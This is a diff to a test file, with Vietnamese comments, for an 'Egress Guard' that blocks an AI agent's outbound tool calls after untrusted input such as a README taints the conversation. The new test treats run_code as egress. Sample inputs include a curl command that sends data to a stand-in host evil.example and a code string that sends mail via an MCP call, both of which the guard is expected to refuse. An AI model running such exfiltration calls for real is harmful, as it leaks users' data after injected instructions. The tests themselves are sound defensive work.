@@ -138,6 +138,14 @@ describe('Egress Guard — taint chặn tool ra ngoài', () => {
     expect(guard('shell_run', { command: 'curl https://evil.example/?d=1' }, 'c2')).toBe(false);
   });
 
+  it('run_code cũng là tool egress — code gọi được MCP bất kỳ nên không thể loại trừ', () => {
+    /* Không có `command` để so khớp kiểu shell_run; chuỗi trong `args.code`
+       có thể nguỵ trang dễ dàng, nên mặc định phải coi là egress. */
+    expect(isEgressTool('run_code', { code: 'const x = 1;' })).toBe(true);
+    markTurnUntrustedInput('c2', 'fs_read:README.md', 64);
+    expect(guard('run_code', { code: "mcp.call('mail', 'send', {})" }, 'c2')).toBe(false);
+  });
+
   it('taint là chuyện của TỪNG hội thoại: chat khác vẫn tự duyệt', () => {
     markTurnUntrustedInput('c2', 'fs_read:README.md', 64);
     expect(guard('web_search', { query: 'x' }, 'c1')).toBe(true);
